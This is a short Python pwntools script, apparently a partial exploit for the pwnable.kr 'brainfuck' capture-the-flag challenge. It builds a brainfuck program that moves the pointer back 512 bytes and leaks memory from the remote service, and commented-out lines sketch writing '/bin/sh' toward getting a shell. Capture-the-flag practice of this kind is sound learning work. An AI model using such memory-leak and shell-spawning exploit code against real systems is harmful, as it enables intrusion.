import pwn

# stack looks like:
# [start]
# [main]
# [dobrainfuck]
# Couple useful tools:

read_count = 0
write_queue = b''
prog = b''

def next(n=1):
    """ increment the pointer n times"""
    global prog
    prog += b'>' * n

def previous(n):
    """ decrement the pointer n times"""
    global prog
    prog = prog + b'<' * n


def readn(n):
    """ Read the current byte and increment the pointer n times"""
    global prog
    global read_count
    read_count = read_count + n
    prog += b'.>' * n

def write(byteValues):
    """ Write the byte array to the current pointer, progresses poitner by len byteValues"""
    global write_queue
    global prog
    write_queue += byteValues
    prog = prog + b',>' * len(byteValues)

# Payload construction
#write(b'/bin/sh')
# prog = previous(prog, 7)
# prog = readn(prog, 7) # This is returning /bin/sh like we expect
previous(512)
readn(512)

# Diagnostics
print("Program size: {} bytes".format(len(prog)))
print("Program:\n{}".format(prog))

# Connect...
host = 'pwnable.kr'
port = 9001
conn = pwn.remote(host, port)
conn.recvline()
conn.recvline()

# Send the program
conn.sendline(str(prog))
conn.send(write_queue)

# Recover results
print(conn.recvall())
